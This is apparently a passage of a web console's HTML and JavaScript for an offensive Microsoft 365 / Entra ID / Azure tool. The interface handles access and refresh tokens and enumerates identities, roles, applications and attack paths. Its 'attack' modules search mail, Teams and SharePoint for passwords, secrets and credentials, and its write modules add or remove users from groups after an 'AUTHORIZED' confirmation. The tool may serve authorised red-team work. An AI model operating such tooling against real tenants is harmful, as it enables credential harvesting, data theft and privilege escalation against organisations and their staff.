<button class="primary" onclick="startRecon()">Run Recon</button>
<button onclick="showReport()">Show Current Report</button>
</section>
</div>
<div id="data" class="panel">
<section class="card"><div class="splitbar"><h2>Data Explorer</h2><button onclick="refreshDataMap()">Refresh Data Map</button></div><div id="tableGroups"></div><div id="dataActionPanel" style="display:none"></div><div id="dataStatus" class="dataStatus"></div><input id="tableFilter" placeholder="Filter current table" oninput="renderTable()"></section>
<div class="tablewrap"><table id="dataTable"></table></div>
</div>
<div id="report" class="panel">
<section class="card"><div class="splitbar"><h2>Live Report</h2><div><button onclick="showReportFrame()">Show Frame</button><button onclick="hideReportFrame()">Hide Frame</button><button onclick="reloadReport()">Refresh Report Frame</button><button onclick="regenerateReport()">Regenerate From Evidence</button></div></div><p class="tokenMeta">Current run: <span id="reportRunPath"></span></p><div id="reportFrameWrap"><iframe id="reportFrame" class="reportFrame" src="/api/report"></iframe></div></section>
</div>
<div id="attacks" class="panel">
<div class="grid">
<section class="card"><h2>Read / Probe Modules</h2>
<button onclick="startAttack({kind:'updatableGroups'})">Probe Updatable Groups</button>
<p class="hint">Microsoft Search query strings can use supported KQL-style terms for the target workload, for example <b>filetype:txt</b>, <b>filename:</b>, quoted phrases, and boolean operators where Microsoft Search supports them for that entity type.</p>
<label>Mail search query</label><input id="mailQuery" value="password OR secret OR credential">
<button onclick="startAttack({kind:'mailPull', query: val('mailQuery')})">Pull Matching Emails</button>
<label>Teams search query</label><input id="teamsQuery" value="password OR secret OR credential">
<button onclick="startAttack({kind:'teamsSearch', query: val('teamsQuery')})">Search Teams Messages</button>
<label>SharePoint / OneDrive search query</label><input id="sharePointQuery" value="password OR secret OR credential OR filetype:txt">
<button onclick="startAttack({kind:'sharePointSearch', query: val('sharePointQuery')})">Search SharePoint / OneDrive</button>
</section>
<section class="card"><h2>Write Modules</h2>
<p class="hint">Write actions are disabled unless confirmation is exactly <b>AUTHORIZED</b>. Use only with explicit written authorisation.</p>
<label>Group object ID</label><input id="groupId">
<label>User object ID</label><input id="userId">
<label>Confirmation</label><input id="confirmText">
<button class="danger" onclick="startAttack({kind:'groupWrite', mode:'add', groupId:val('groupId'), userId:val('userId'), confirmText:val('confirmText')})">Add User To Group</button>
<button class="danger" onclick="startAttack({kind:'groupWrite', mode:'remove', groupId:val('groupId'), userId:val('userId'), confirmText:val('confirmText')})">Remove User From Group</button>
</section>
</div>
</div>
<div id="logs" class="panel">
<section class="card"><div class="splitbar"><h2>Tasks & Logs</h2><button onclick="refreshTasks()">Refresh Tasks</button></div><div id="taskList" class="tabs"></div><div id="taskSummary"></div><div id="taskLog" class="timeline"></div></section>
</div>
</main>
</div>
<div id="tokenModalBackdrop" class="modalBackdrop" onclick="closeTokenModal(event)"><div class="modal" onclick="event.stopPropagation()"><div class="splitbar"><h2 id="tokenModalTitle">Token Detail</h2><button onclick="closeTokenModal()">Close</button></div><div id="tokenModalBody"></div></div></div>
<script>
const modules = ['tenant','users','auth','roles','administrativeUnits','groups','apps','devices','conditionalAccess','m365','arm','correlator'];
const tableCatalog = [
  {group:'Tenant & Policy', tables:['domains','conditional-access-policies']},
  {group:'Identity', tables:['users','risky-users','risk-detections','role-members','pim-eligible-roles','administrative-units','administrative-unit-member-samples']},
  {group:'Groups', tables:['groups','group-owner-samples','group-member-samples','updatable-groups']},
  {group:'Applications & Permissions', tables:['applications','service-principals','application-owners','service-principal-owners','oauth2-grants','app-role-assignments','federated-identity-credentials','role-assignments']},
  {group:'Permissions', tables:['permissions-enum','oauth2-grants','app-role-assignments','role-assignments','pim-eligible-roles']},
  {group:'Devices', tables:['devices','device-owner-map']},
  {group:'M365', tables:['sharepoint-discovered-site-urls','sharepoint-sites','sharepoint-site-permissions','drive-shared-with-me','joined-teams','team-channels','inbox-message-rules','email-search-results','teams-search-results','sharepoint-search-results']},
  {group:'Azure', tables:['arm-subscriptions','arm-resource-groups','arm-resources','arm-role-assignments','arm-role-definitions']},
  {group:'Correlation', tables:['attack-paths','graph-nodes','graph-edges']},
  {group:'Run DB', tables:['db-entities','db-relations','db-directory-role-definitions','db-arm-role-definitions','db-unresolved-ids','api-calls','findings']}
];
const collectActions = {
  'updatable-groups': {kind:'updatableGroups', label:'Collect now'},
  'device-owner-map': {kind:'deviceMap', label:'Map now'},
  'email-search-results': {kind:'mailPull', label:'Configure search', queryId:'mailQuery', form:'mail'},
  'teams-search-results': {kind:'teamsSearch', label:'Configure search', queryId:'teamsQuery', form:'teams'},
  'sharepoint-search-results': {kind:'sharePointSearch', label:'Configure search', queryId:'sharePointQuery', form:'sharepoint'},
  'sharepoint-discovered-site-urls': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'sharepoint-sites': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'sharepoint-site-permissions': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'joined-teams': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'team-channels': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'inbox-message-rules': {kind:'collectModule', modules:['m365'], label:'Collect now'},
  'conditional-access-policies': {kind:'collectModule', modules:['conditionalAccess'], label:'Collect now'},
  'risky-users': {kind:'collectModule', modules:['auth'], label:'Collect now'},
  'risk-detections': {kind:'collectModule', modules:['auth'], label:'Collect now'},
  'pim-eligible-roles': {kind:'collectModule', modules:['roles'], label:'Collect now'},
  'permissions-enum': {kind:'collectModule', modules:['apps'], label:'Collect now'},
  'arm-subscriptions': {kind:'collectModule', modules:['arm'], label:'Collect now'},
  'arm-resource-groups': {kind:'collectModule', modules:['arm'], label:'Collect now'},
  'arm-resources': {kind:'collectModule', modules:['arm'], label:'Collect now'},
  'arm-role-assignments': {kind:'collectModule', modules:['arm'], label:'Collect now'},
  'arm-role-definitions': {kind:'collectModule', modules:['arm'], label:'Collect now'},
  'attack-paths': {kind:'collectModule', modules:['correlator'], label:'Collect now'},
  'db-directory-role-definitions': {kind:'collectModule', modules:['roles'], label:'Rebuild now'},
  'db-arm-role-definitions': {kind:'collectModule', modules:['arm'], label:'Rebuild now'},
  'db-unresolved-ids': {kind:'collectModule', modules:['roles','apps','arm'], label:'Rebuild now'}
};
let state = {}, activeTask = null, currentTable = null, currentRows = [], selectedTask = null, activeDataGroup = 'Tenant & Policy', activeDataAction = null;
let tableLoadSeq = 0;
let logCache = {};
let dataActionValues = {};
let sessionModeChosen = false, sortKey = null, sortDir = 'asc';
function val(id){ return document.getElementById(id).value; }
function esc(v){ return String(v ?? '').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function setActivity(message, mode){
  const bar=document.getElementById('activityBar'), text=document.getElementById('activityText'), time=document.getElementById('activityTime');
  if(!bar||!text) return;
  text.textContent=message||'Ready.';
  if(time) time.textContent=new Date().toLocaleTimeString();
  bar.className='activityBar'+(mode?' '+mode:'');
}
async function refreshDataMap(){ setActivity('Refreshing data map...', 'busy'); await refreshState(); setActivity('Data map refreshed.'); }
async function refreshTasks(){ setActivity('Refreshing task list...', 'busy'); await refreshState(); setActivity('Task list refreshed.'); }
async function startNewRunMode(){
  const status=document.getElementById('loadRunStatus');
  status.textContent='Creating new run...';
  setActivity('Creating new run workspace...', 'busy');
  const j=await postJson('/api/run/new',{name:val('newRunName')});
  if(j.ok){
    sessionModeChosen=true;
    selectedTask=null; activeTask=null; logCache={};
    status.textContent='Created '+j.run.currentRun;
    setActivity('New run created: '+j.run.currentRun);
    await refreshState();
    showPanelById('auth');
  } else {
    status.textContent=j.error||'Could not create run';
    setActivity(j.error||'Could not create run', 'error');
  }
}
function showPanel(id, btn){ if(!sessionModeChosen && !state.currentRun && id!=='overview'){ setActivity('Choose Load Existing Run or Start New Run on Overview first.', 'busy'); return; } document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); }
function showPanelById(id){ const btn=[...document.querySelectorAll('.nav button')].find(b=>b.getAttribute('onclick') && b.getAttribute('onclick').includes(`'${id}'`)); if(btn) showPanel(id, btn); }
async function getJson(path){ const r=await fetch(path); return await r.json(); }
async function postJson(path, body){ const r=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})}); return await r.json(); }
function initModules(){ document.getElementById('moduleChecks').innerHTML = modules.map(m=>`<label><input type="checkbox" class="mod" value="${m}" checked style="width:auto"> ${m}</label>`).join(''); }
async function refreshState(){ saveDataActionValues(); state = await getJson('/api/state'); populateOptionLists(); renderOverview(); renderTableGroups(); renderTaskList(); document.getElementById('reportRunPath').textContent = state.currentRun || 'none'; restoreDataActionPanel(); }
function populateOptionLists(){
  const opts=state.options||{};
  const clients=opts.clients||[], resources=opts.resources||[], tokenNames=opts.tokenNames||[];
  const clientHtml = clients.map(x=>`<option value="${esc(x.alias)}">${esc(x.alias)} - ${esc(x.name||x.value)} (${esc(x.value)})</option>`).join('') + '<option value="__custom">Custom client ID / alias...</option>';
  const resourceHtml = resources.map(x=>`<option value="${esc(x.alias)}">${esc(x.alias)} - ${esc(x.name||x.value)} (${esc(x.value)})</option>`).join('') + '<option value="__custom">Custom resource...</option>';
  ['authClientPreset','refreshClientPreset'].forEach(id=>{ const el=document.getElementById(id); const current=el.value; el.innerHTML=clientHtml; if(current) el.value=current; });
  ['authResourcePreset','refreshResourcePreset'].forEach(id=>{ const el=document.getElementById(id); const current=el.value; el.innerHTML=resourceHtml; if(current) el.value=current; });
  if(!document.getElementById('authClientPreset').value) document.getElementById('authClientPreset').value='office';
  if(!document.getElementById('refreshClientPreset').value) document.getElementById('refreshClientPreset').value='office';
  if(!document.getElementById('authResourcePreset').value) document.getElementById('authResourcePreset').value='msgraph';
  if(!document.getElementById('refreshResourcePreset').value) document.getElementById('refreshResourcePreset').value='arm';
  document.getElementById('tokenNameList').innerHTML = tokenNames.map(x=>`<option value="${esc(x)}"></option>`).join('');
  toggleCustomPickers();
  handleAuthMethodChange(false);
}
function handleAuthMethodChange(announce=true){
  const method=val('authMethod'), client=document.getElementById('authClientPreset');
  if(method==='Interactive' && client && (client.value==='office' || client.value==='d3590ed6-52b3-4102-aeff-aad2292ab01c' || !client.value)){
    client.value='azcli';
    if(announce) setActivity('Interactive auth uses Azure CLI client for loopback redirect compatibility.', 'busy');
  }
  toggleCustomPickers();
}
function toggleCustomPickers(){
  [['authClientPreset','authClientCustom'],['refreshClientPreset','refreshClientCustom'],['authResourcePreset','authResourceCustom'],['refreshResourcePreset','refreshResourceCustom']].forEach(pair=>{
    const preset=document.getElementById(pair[0]), custom=document.getElementById(pair[1]);
    custom.style.display = preset.value==='__custom' ? 'block' : 'none';
  });
}
function pickerValue(presetId, customId){ const p=val(presetId); return p==='__custom' ? val(customId) : p; }
function pickerIsDefaultOffice(presetId, customId){ const p=val(presetId), c=val(customId); return p!=='__custom' && (!p || p==='office' || p==='d3590ed6-52b3-4102-aeff-aad2292ab01c') && !c; }
function renderOverview(){
  const tok = state.tokens || {};
  const names = Object.keys(tok);
  const ru = state.runUser || null;
  const runUserHtml = ru ? `<div class="hint"><h3>Run User</h3><div class="tokenMeta"><b>User:</b> ${esc(ru.displayName||ru.user||'unknown')}<br><b>UPN/Mail:</b> ${esc(ru.user||ru.mail||'')}<br><b>ObjectId:</b> ${esc(ru.objectId||'')}<br><b>Tenant:</b> ${esc(ru.tenantId||'')}<br><b>AppId:</b> ${esc(ru.appId||'')}<br><b>Audience:</b> ${esc(ru.audience||'')}<br><b>Expires:</b> ${esc(ru.expires||'unknown')}${ru.isExpired?' (expired)':''}<br><b>Scopes:</b> ${esc(ru.scopes||'')}<br><b>Roles:</b> ${esc(Array.isArray(ru.roles)?ru.roles.join(', '):(ru.roles||''))}<br><b>Job/Dept:</b> ${esc([ru.jobTitle,ru.department].filter(Boolean).join(' / '))}</div></div>` : '<div class="empty">No Graph run user could be derived from current run tokens yet.</div>';
  const tokenHtml = names.length ? `<div class="tokenGrid">${names.map(k=>{
    const t=tok[k]||{};
    const expired=!!t.isExpired;
    const stateLabel=t.expires ? (expired?'expired':'valid') : 'unknown';
    const refreshButton=t.canRefresh?`<button class="tokenAction" onclick="event.stopPropagation(); refreshTokenName('${esc(k)}')">${expired?'Refresh Expired Token':'Refresh With Refresh Token'}</button>`:'';
    return `<div class="tokenCard ${expired?'expired':''}" onclick="showTokenDetail('${esc(k)}')"><h3>$${esc(k)} <span class="tokenSource">${esc(t.source||'unknown')}</span><span class="tokenState ${expired?'expired':''}">${esc(stateLabel)}</span></h3><div class="tokenMeta"><b>Audience:</b> ${esc(t.audience||t.status||'unknown')}<br><b>User:</b> ${esc(t.user||'')}<br><b>Expires:</b> ${esc(t.expires||'unknown')}<br><b>Refresh token:</b> ${t.hasRefreshToken?'present':'not present'}<br>${t.status?'<b>Status:</b> '+esc(t.status):''}</div>${refreshButton}</div>`;
  }).join('')}</div>` : '<p>No live token variables found yet.</p>';
  document.getElementById('overview-body').innerHTML = `<p><b>Current run:</b> ${esc(state.currentRun || 'none')}</p><p><b>Evidence tables:</b> ${(state.tables||[]).length}</p>${runUserHtml}<h3>Tokens</h3>${tokenHtml}`;
}
async function refreshTokens(){ setActivity('Refreshing current run token view...', 'busy'); await postJson('/api/tokens/refresh',{}); await refreshState(); setActivity('Current run token view refreshed.'); }
async function loadRun(){ const status=document.getElementById('loadRunStatus'); status.textContent='Loading...'; setActivity('Loading selected run...', 'busy'); const j=await postJson('/api/run',{path:val('loadRunPath')}); if(j.ok){ sessionModeChosen=true; selectedTask=null; activeTask=null; logCache={}; document.getElementById('taskLog').innerHTML=''; document.getElementById('taskSummary').innerHTML=''; status.textContent='Loaded '+j.run.currentRun; setActivity('Run loaded: '+j.run.currentRun); await refreshState(); reloadReport(); } else { status.textContent=j.error||'Load failed'; setActivity(j.error||'Run load failed.', 'error'); } }
async function clearRun(){ const status=document.getElementById('loadRunStatus'); status.textContent='Clearing current run...'; setActivity('Clearing current run selection...', 'busy'); const j=await postJson('/api/run/clear',{}); status.textContent=j.ok?'Current run cleared.':'Clear failed'; setActivity(j.ok?'Current run selection cleared.':'Clear failed', j.ok?'':'error'); sessionModeChosen=false; selectedTask=null; activeTask=null; logCache={}; currentTable=null; currentRows=[]; document.getElementById('dataTable').innerHTML='<tbody><tr><td>No run loaded.</td></tr></tbody>'; document.getElementById('taskLog').innerHTML=''; document.getElementById('taskSummary').innerHTML=''; await refreshState(); }
function showTokenDetail(name){
  const t=(state.tokens||{})[name];
  if(!t) return;
  document.getElementById('tokenModalTitle').textContent = '$' + name;
  const refreshButton=t.canRefresh?`<p><button class="primary" onclick="refreshTokenName('${esc(name)}')">${t.isExpired?'Refresh Expired Token':'Refresh With Refresh Token'}</button></p><p class="tokenMeta">Refresh-token validity is confirmed by the refresh request; invalid or revoked refresh tokens will fail in the task log.</p>`:'';
  document.getElementById('tokenModalBody').innerHTML = `<div class="tokenMeta"><b>Source:</b> ${esc(t.source||'')}<br><b>Status:</b> ${esc(t.status || (t.isExpired?'Expired':'Valid/unknown'))}<br><b>Audience:</b> ${esc(t.audience||'')}<br><b>Tenant:</b> ${esc(t.tenantId||'')}<br><b>AppId:</b> ${esc(t.appId||'')}<br><b>User:</b> ${esc(t.user||'')}<br><b>Expires:</b> ${esc(t.expires||'')}<br><b>Expires in seconds:</b> ${esc(t.expiresInSeconds??'')}<br><b>Scopes:</b> ${esc(t.scopes||'')}<br><b>Roles:</b> ${esc(Array.isArray(t.roles)?t.roles.join(', '):(t.roles||''))}<br><b>Refresh token:</b> ${t.hasRefreshToken?'present; validity checked on refresh':'not present'}<br><b>Access token:</b> ${esc(t.accessTokenPreview||'')}</div>${refreshButton}<h3>Claims</h3><pre>${esc(JSON.stringify(t.claims||{},null,2))}</pre>`;
  document.getElementById('tokenModalBackdrop').style.display='flex';
}
function closeTokenModal(ev){ if(ev && ev.target.id!=='tokenModalBackdrop') return; document.getElementById('tokenModalBackdrop').style.display='none'; }
async function refreshTokenName(name){
  const t=(state.tokens||{})[name]||{};
  setActivity(`Refreshing ${name} in current run...`, 'busy');
  const body={mode:'single', inputVar:name, outVar:name, resource:t.audience||'msgraph', clientId:pickerValue('refreshClientPreset','refreshClientCustom')||'office', tenantId:t.tenantId||val('refreshTenantId'), force:true};
  const j=await postJson('/api/refresh',body);
  if(!j.ok){ setActivity(j.error||`Failed to queue refresh for ${name}`, 'error'); return; }
  activeTask=j.task.id; selectedTask=j.task.id;
  setActivity(`Refresh queued for ${name}: ${activeTask}`);
  await refreshState();
  await refreshTask(activeTask, true);
}
function availableTables(){ const m={}; (state.tables||[]).forEach(t=>m[t.name]=t); return m; }
function prettyName(name){ return name.split('-').map(x=>x.charAt(0).toUpperCase()+x.slice(1)).join(' '); }
function renderTableGroups(){
  saveDataActionValues();
  const root=document.getElementById('tableGroups');
  const have=availableTables();
  const known=new Set(tableCatalog.flatMap(g=>g.tables));
  if(!tableCatalog.some(g=>g.group===activeDataGroup)) activeDataGroup = tableCatalog[0].group;
  const active = tableCatalog.find(g=>g.group===activeDataGroup) || tableCatalog[0];
  let html='<div class="explorerShell"><div class="groupNav">';
  html += tableCatalog.map(g=>`<button class="${g.group===activeDataGroup?'active':''}" onclick="setDataGroup('${esc(g.group)}')">${esc(g.group)}</button>`).join('');
  html += '</div><div><div class="datasetBar">';
  active.tables.forEach(name=>{
    const t=have[name];
    const action=collectActions[name];
    if(t) {
      html += `<button class="${currentTable===name?'active':''}" onclick="openDatasetTab('${esc(name)}', true)">${esc(prettyName(name))}</button>`;
    } else if(action) {
      html += `<button class="missing ${currentTable===name?'active':''}" onclick="openDatasetTab('${esc(name)}', false)">${esc(prettyName(name))} - ${esc(action.label)}</button>`;
    } else {
      html += `<button disabled title="Not collected yet">${esc(prettyName(name))}</button>`;
    }
  });
  html += '</div><div id="inlineDataActionPanel" class="dataActionPanel"></div>';
  const missing=active.tables.filter(name=>!have[name]);
  if(missing.length) html += `<div class="empty">${missing.length} expected dataset(s) not collected yet: ${esc(missing.map(prettyName).join(', '))}</div>`;
  html += '</div></div>';
  const extra=(state.tables||[]).filter(t=>!known.has(t.name));
  if(extra.length) html += `<div class="tableGroup"><h3>Other Evidence</h3><div class="datasetBar">${extra.map(t=>`<button class="${currentTable===t.name?'active':''}" onclick="openDatasetTab('${esc(t.name)}', true)">${esc(t.name)}</button>`).join('')}</div></div>`;
  root.innerHTML=html || '<div class="empty">No evidence tables yet. Run recon or an attack module.</div>';
  restoreDataActionPanel();
}
function setDataGroup(name){ activeDataGroup=name; activeDataAction=null; renderTableGroups(); setDataStatus(`Showing ${name}. Pick a dataset.`, false); }
function setDataStatus(message, isError){ const el=document.getElementById('dataStatus'); el.textContent=message||''; el.className='dataStatus'+(isError?' error':''); }
function saveDataActionValues(){
  Object.values(collectActions).forEach(action=>{
    if(action.queryId){ const el=document.getElementById(action.queryId); if(el) dataActionValues[action.queryId]=el.value; }
    if(action.form){ const recent=document.getElementById(`recent-${action.form}`); if(recent) dataActionValues[`recent-${action.form}`]=recent.value; }
  });
}
function defaultQueryFor(action){
  if(action.form==='sharepoint') return 'password OR secret OR credential OR filetype:txt';
  if(action.form==='mail' || action.form==='teams') return 'password OR secret OR credential';
  return '';
}
function restoreDataActionPanel(){
  const name=activeDataAction || (collectActions[currentTable] ? currentTable : null);
  if(name) renderDataActionPanel(name);
}
function openDatasetTab(name, hasTable){
  currentTable=name;
  activeDataAction=collectActions[name] ? name : null;
  renderTableGroups();
  if(hasTable) {
    loadTable(name);
  } else {
    currentRows=[];
    document.getElementById('dataTable').innerHTML=`<tbody><tr><td>${esc(prettyName(name))} has not been collected yet.</td></tr></tbody>`;
    setDataStatus(`${prettyName(name)} is not collected. Use the action panel below to collect it.`, false);
  }
}
function prepareDatasetAction(name){ currentTable=name; activeDataAction=name; renderTableGroups(); renderDataActionPanel(name); setDataStatus(`${prettyName(name)} ready. Configure the action below.`, false); }
function renderDataActionPanel(name){
  const el=document.getElementById('inlineDataActionPanel') || document.getElementById('dataActionPanel');
  const action=collectActions[name];
  if(!el) return;
  if(!action){ el.innerHTML=''; return; }
  const title=prettyName(name);
  if(!action.form){
    el.innerHTML=`<div class="hint"><h3>${esc(title)}</h3><p>Rerun this dataset in isolation. Existing evidence is preserved in run history before replacement or merge.</p><button class="danger rerunAction" onclick="collectDataset('${esc(name)}')">Rerun This Dataset</button></div>`;
    return;
  }
  const qid=action.queryId, recentId=`recent-${action.form}`;
  const qval=dataActionValues[qid] ?? document.getElementById(qid)?.value ?? defaultQueryFor(action);
  const rval=dataActionValues[recentId] ?? document.getElementById(recentId)?.value ?? '50';
  const recent = action.form==='sharepoint' ? '' : `<label>Extract most recent count<input id="${recentId}" type="number" min="1" max="500" value="${esc(rval)}" oninput="saveDataActionValues()"></label><button onclick="collectRecent('${esc(name)}')">Extract Most Recent</button>`;
  el.innerHTML=`<div class="hint"><h3>${esc(title)}</h3><div class="controlRow"><label>Search query<input id="${qid}" value="${esc(qval)}" oninput="saveDataActionValues()"></label>${recent}</div><button class="danger rerunAction" onclick="collectDataset('${esc(name)}')">Run / Rerun Search</button></div>`;
}
async function collectDataset(name){
  const action=collectActions[name];
  if(!action) return;
  activeDataAction=name;
  saveDataActionValues();
  renderDataActionPanel(name);
  setDataStatus(`Starting ${prettyName(name)} collection...`, false);
  setActivity(`Starting ${prettyName(name)} collection...`, 'busy');
  const body={kind:action.kind, dataset:name};
  if(action.queryId) body.query=val(action.queryId);
  if(action.modules) body.modules=action.modules;
  await startAttack(body, true);
  setDataStatus(`${prettyName(name)} collection started. Progress is in Tasks & Logs; the data map will refresh when it completes.`, false);
  setActivity(`${prettyName(name)} collection started.`);
}
async function collectRecent(name){
  const action=collectActions[name];
  activeDataAction=name;
  saveDataActionValues();
  const count=Number(val(`recent-${action.form}`)||50);
  await startAttack({kind:action.form==='mail'?'mailRecent':'teamsRecent', count:count}, true);
}
async function loadTable(name){
  const seq=++tableLoadSeq;
  currentTable=name;
  activeDataAction=collectActions[name] ? name : null;
  currentRows=[]; sortKey=null; sortDir='asc';
  renderTableGroups();
  document.getElementById('tableFilter').value='';
  document.getElementById('dataTable').innerHTML=`<tbody><tr><td>Loading ${esc(prettyName(name))}...</td></tr></tbody>`;
  setDataStatus(`Loading ${prettyName(name)}...`, false);
  try {
    const j=await getJson('/api/table?name='+encodeURIComponent(name));
    if(seq!==tableLoadSeq || currentTable!==name) return;
    if(!j.ok && j.error) throw new Error(j.error);
    currentRows=Array.isArray(j.rows) ? j.rows : (j.rows ? [j.rows] : []);
    setDataStatus(`${prettyName(name)} loaded: ${currentRows.length} row(s).`, false);
    renderTable();
  } catch(e) {
    if(seq!==tableLoadSeq) return;
    currentRows=[];
    document.getElementById('dataTable').innerHTML=`<tbody><tr><td>Failed to load ${esc(prettyName(name))}: ${esc(e.message||e)}</td></tr></tbody>`;
    setDataStatus(`Failed to load ${prettyName(name)}: ${e.message||e}`, true);
  }
}
function renderCell(v){ const text=typeof v==='object'?JSON.stringify(v):String(v ?? ''); if(/^https?:\/\//i.test(text)) return `<a href="${esc(text)}" target="_blank" rel="noopener noreferrer">${esc(text)}</a>`; return esc(text); }
function sortByColumn(key){ if(sortKey===key) sortDir=sortDir==='asc'?'desc':'asc'; else { sortKey=key; sortDir='asc'; } renderTable(); }
function renderTable(){ const term=(document.getElementById('tableFilter').value||'').toLowerCase(); let rows=term?currentRows.filter(r=>JSON.stringify(r).toLowerCase().includes(term)):currentRows.slice(); if(sortKey){ rows.sort((a,b)=>String(a[sortKey]??'').localeCompare(String(b[sortKey]??''), undefined, {numeric:true,sensitivity:'base'})*(sortDir==='asc'?1:-1)); } const keys=[]; rows.forEach(r=>Object.keys(r||{}).forEach(k=>{ if(!keys.includes(k)) keys.push(k); })); if(!keys.length){ document.getElementById('dataTable').innerHTML=`<tbody><tr><td>${currentTable ? 'No rows matched this table/filter.' : 'No rows selected. Pick a collected dataset above.'}</td></tr></tbody>`; return; } document.getElementById('dataTable').innerHTML='<caption style="text-align:left;padding:7px 8px;font-weight:600">'+esc(prettyName(currentTable||''))+' - '+rows.length+' row(s)</caption><thead><tr>'+keys.map(k=>`<th onclick="sortByColumn('${esc(k)}')" title="Sort by ${esc(k)}">${esc(k)}${sortKey===k?(sortDir==='asc'?' ^':' v'):''}</th>`).join('')+'</tr></thead><tbody>'+rows.map(r=>'<tr>'+keys.map(k=>`<td>${renderCell(r[k])}</td>`).join('')+'</tr>').join('')+'</tbody>'; }
function renderTaskList(){
  const list=document.getElementById('taskList');
  const tasks=state.tasks||[];
  list.innerHTML=tasks.length ? tasks.map(t=>`<button class="${(selectedTask||activeTask)===t.id?'active':''}" onclick="selectTask('${esc(t.id)}')">${esc(t.kind)} - ${esc(t.state)}</button>`).join('') : '<span class="empty">No tasks yet.</span>';
}
async function selectTask(id){ selectedTask=id; activeTask=id; renderTaskList(); await refreshTask(id, true); showPanelById('logs'); }
function levelFor(entry){
  const msg=String(entry.message||'').toLowerCase();
  if(msg.includes('failed')||msg.includes('error')||msg.includes('exception')) return 'error';
  if(msg.includes('warn')||msg.includes('denied')||msg.includes('missing')) return 'warn';
  if(msg.includes('complete')||msg.includes('saved')||msg.includes('stored')) return 'ok';
  return 'info';
}
function appendLogRows(id, entries, reset){
  const el=document.getElementById('taskLog');
  if(reset || !logCache[id]) { logCache[id]=0; el.innerHTML=''; }
  const start=logCache[id] || 0;
  const fresh=(entries||[]).slice(start);
  fresh.forEach(entry=>{
    const lvl=levelFor(entry);
    const row=document.createElement('div');
    row.className='logrow log-'+lvl;
    row.innerHTML=`<div class="time">${esc(entry.timestamp||'')}</div><div class="level">${esc(lvl)}</div><div>${esc(entry.message||'')}</div>`;
    if(entry.data){
      const data=document.createElement('div');
      data.className='logdata';
      data.textContent=JSON.stringify(entry.data,null,2);
      row.appendChild(data);
    }
    el.appendChild(row);
  });
  logCache[id]=(entries||[]).length;
  if(fresh.length) el.scrollTop=el.scrollHeight;
}
async function startAuth(){ handleAuthMethodChange(false); setActivity('Starting authentication task...', 'busy'); document.getElementById('deviceBox').style.display='block'; document.getElementById('deviceBox').innerHTML='<h3>Authentication starting</h3><p>Waiting for the authentication helper to return instructions...</p>'; const body={tenant:val('authTenant'), tenantId:val('authTenantId'), method:val('authMethod'), clientId:pickerValue('authClientPreset','authClientCustom'), clientIdIsDefaultOffice:pickerIsDefaultOffice('authClientPreset','authClientCustom'), resource:pickerValue('authResourcePreset','authResourceCustom'), scope:val('authScope'), outVar:val('authOutVar'), redirectPort:val('authRedirectPort'), redirectPath:val('authRedirectPath'), redirectUri:val('authRedirectUri'), useV1Endpoint:document.getElementById('authUseV1').checked, useCAE:document.getElementById('authCae').checked, device:val('authDevice'), browser:val('authBrowser'), customUserAgent:val('authCustomUserAgent')}; const j=await postJson('/api/auth',body); if(!j.ok){ setActivity(j.error||'Authentication task could not be queued.', 'error'); document.getElementById('deviceBox').innerHTML=`<h3>Authentication not started</h3><p>${esc(j.error||'Create or load a run first.')}</p>`; return; } activeTask=j.task.id; selectedTask=j.task.id; setActivity('Authentication task queued: '+activeTask); await refreshState(); await refreshTask(activeTask, true); }
async function startRefresh(){ setActivity('Starting token refresh task...', 'busy'); const body={mode:val('refreshMode'), inputVar:val('refreshInputVar'), tenantId:val('refreshTenantId'), clientId:pickerValue('refreshClientPreset','refreshClientCustom'), resource:pickerValue('refreshResourcePreset','refreshResourceCustom'), outVar:val('refreshOutVar'), scope:val('refreshScope'), onlyAudiences:val('refreshOnly'), skipAudiences:val('refreshSkip'), useV1Endpoint:document.getElementById('refreshUseV1').checked, useCAE:document.getElementById('refreshCae').checked, force:document.getElementById('refreshForce').checked, device:val('refreshDevice'), browser:val('refreshBrowser'), customUserAgent:val('refreshCustomUserAgent')}; const j=await postJson('/api/refresh',body); if(!j.ok){ setActivity(j.error||'Refresh task could not be queued.', 'error'); return; } activeTask=j.task.id; selectedTask=j.task.id; setActivity('Refresh task queued: '+activeTask); showPanelById('logs'); await refreshState(); await refreshTask(activeTask, true); }
async function startRecon(){ setActivity('Starting recon task...', 'busy'); const selected=[...document.querySelectorAll('.mod:checked')].map(x=>x.value); const j=await postJson('/api/recon',{tenant:val('authTenant'), modules:selected, includeM365Search:document.getElementById('includeM365Search').checked, runMode:val('reconRunMode')}); if(!j.ok){ setActivity(j.error||'Recon task could not be queued.', 'error'); return; } activeTask=j.task.id; selectedTask=j.task.id; setActivity('Recon task queued: '+activeTask); showPanelById('logs'); await refreshState(); await refreshTask(activeTask, true); }
async function startAttack(body, stayOnData){ setActivity('Starting module task...', 'busy'); const j=await postJson('/api/attack',body); if(!j.ok){ setActivity(j.error||'Module task could not be queued.', 'error'); return; } activeTask=j.task.id; selectedTask=j.task.id; setActivity('Module task queued: '+activeTask); if(!stayOnData) showPanelById('logs'); await refreshState(); await refreshTask(activeTask, true); }
